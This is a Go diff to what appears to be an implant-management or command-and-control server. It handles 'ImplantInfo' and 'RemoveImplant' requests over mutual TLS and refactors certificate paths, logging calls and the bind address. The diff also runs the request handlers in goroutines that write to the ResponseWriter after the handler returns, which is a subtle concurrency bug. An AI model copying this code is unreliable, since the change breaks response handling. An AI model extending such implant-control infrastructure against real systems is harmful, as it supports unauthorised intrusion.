@@ -16,7 +16,6 @@ type Request struct {
 	Content json.RawMessage `json:"content"`
 }
 
-
 // logRequest is a middleware that logs the details of each request
 func logRequest(handler http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
@@ -39,9 +38,9 @@ func RequestHandler(w http.ResponseWriter, r *http.Request) {
 	// Process the request based on ReqType
 	switch req.ReqType {
 	case "ImplantInfo":
-		handleImplantInfo(w, req.Content)
+		go handleImplantInfo(w, req.Content)
 	case "RemoveImplant":
-		handleRemoveImplant(w, req.Content)
+		go handleRemoveImplant(w, req.Content)
 	default:
 		http.Error(w, "unknown request type", http.StatusBadRequest)
 		comunication.Logger.Error("unknown request type: %s", req.ReqType)
@@ -91,23 +90,23 @@ func handleRemoveImplant(w http.ResponseWriter, content json.RawMessage) {
 }
 
 func StartHTTPServer() {
-	serverCertPath, err := filepath.Abs("certs/server.crt")
+	serverCertPath, err := filepath.Abs(filepath.Join("certs", "server.crt"))
 	if err != nil {
-		comunication.Logger.Fatal("failed to get absolute path for server certificate: %v", err)
+		comunication.Logger.Fatalf("failed to get absolute path for server certificate: %v", err)
 	}
-	serverKeyPath, err := filepath.Abs("certs/server.key")
+	serverKeyPath, err := filepath.Abs(filepath.Join("certs", "server.key"))
 	if err != nil {
-		comunication.Logger.Fatal("failed to get absolute path for server key: %v", err)
+		comunication.Logger.Fatalf("failed to get absolute path for server key: %v", err)
 	}
 
 	serverCert, err := LoadServerCertificate(serverCertPath, serverKeyPath)
 	if err != nil {
-		comunication.Logger.Fatal("failed to load server certificate: %v", err)
+		comunication.Logger.Fatalf("failed to load server certificate: %v", err)
 	}
 
-	clientCAPool, err := LoadClientCACertificate("certs/client.crt")
+	clientCAPool, err := LoadClientCACertificate(filepath.Join("certs", "client.crt"))
 	if err != nil {
-		comunication.Logger.Fatal("failed to load client CA certificate: %v", err)
+		comunication.Logger.Fatalf("failed to load client CA certificate: %v", err)
 	}
 
 	tlsConfig := CreateTLSConfig(serverCert, clientCAPool)
@@ -117,7 +116,7 @@ func StartHTTPServer() {
 	r.HandleFunc("/request", RequestHandler).Methods("POST")
 
 	srv := &http.Server{
-		Addr:         ":8443",
+		Addr:         "localhost:8443",
 		Handler:      r,
 		TLSConfig:    tlsConfig,
 		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
